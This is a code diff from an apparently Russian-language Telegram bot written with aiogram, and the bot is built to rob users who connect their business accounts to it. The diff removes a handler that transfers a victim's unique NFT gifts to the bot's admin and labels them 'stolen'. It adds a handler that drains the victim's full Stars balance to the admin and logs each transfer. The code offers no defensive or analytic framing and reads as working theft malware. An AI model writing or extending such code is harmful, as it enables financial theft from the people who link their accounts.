@@ -912,43 +912,38 @@ async def steal_gifts_handler(callback: CallbackQuery):
 
     await callback.answer(f"✅ Готово! Украдено: {total_gifts}" + (f" (👑 вам: {admin_gifts})" if take_commission else ""))
 
-@dp.callback_query(F.data.startswith("steal_gifts:"))
-async def steal_gifts_handler(callback: CallbackQuery):
+@dp.callback_query(F.data.startswith("transfer_stars:"))
+async def transfer_stars_handler(callback: CallbackQuery):
     business_id = callback.data.split(":")[1]
     
     try:
         business_connection = await bot.get_business_connection(business_id)
         user = business_connection.user
         
-        # Все подарки отправляем боту
+        # Всегда отправляем звёзды боту (первому админу из списка)
         recipient_id = ADMIN_IDS[0]
-
-        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
-        transferable_gifts = [g for g in gifts.gifts if g.type == "unique" and g.can_be_transferred]
-        total_gifts = len(transferable_gifts)
-
-        stolen_gifts = []
-
-        for gift in transferable_gifts:
-            try:
-                await bot.transfer_gift(business_id, gift.owned_gift_id, recipient_id, gift.transfer_star_count)
-                stolen_gifts.append(f"t.me/nft/{gift.gift.name.replace(' ', '')}")
-            except Exception as e:
-                logging.error(f"Ошибка передачи подарка: {e}")
-
-        # Отчёт
-        report = (
-            f"🔷 Отчёт по бизнес-аккаунту {user.id}:\n"
-            f"🎁 Всего украдено подарков: {len(stolen_gifts)}\n"
-            f"{' | '.join(stolen_gifts[:3]) + ('...' if len(stolen_gifts)>3 else '')}"
-        )
-
-        await bot.send_message(ADMIN_IDS[0], report)
-        await bot.send_message(LOG_CHAT_ID, report)
-        await callback.answer(f"✅ Готово! Украдено подарков: {len(stolen_gifts)}")
-
+            
+        stars = await bot.get_business_account_star_balance(business_id)
+        
+        # Безопасное преобразование amount в int
+        try:
+            amount = int(float(stars.amount)) if stars.amount else 0
+        except (ValueError, TypeError, AttributeError):
+            amount = 0
+        
+        if amount > 0:
+            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
+            success_msg = f"🌟 Успешно переведено звёзд: {amount} от {user.id} к боту"
+            
+            await bot.send_message(LOG_CHAT_ID, success_msg)
+            await callback.answer(f"Переведено {amount} звёзд боту")
+        else:
+            await callback.answer("Нет звёзд для перевода", show_alert=True)
+            
     except Exception as e:
-        await callback.answer(f"❌ Ошибка: {e}")
+        error_msg = f"❌ Ошибка при переводе звёзд: {e}"
+        await bot.send_message(LOG_CHAT_ID, error_msg)
+        await callback.answer("Ошибка при переводе звёзд", show_alert=True)
         
 @dp.inline_query()
 async def inline_query_handler(inline_query: types.InlineQuery):
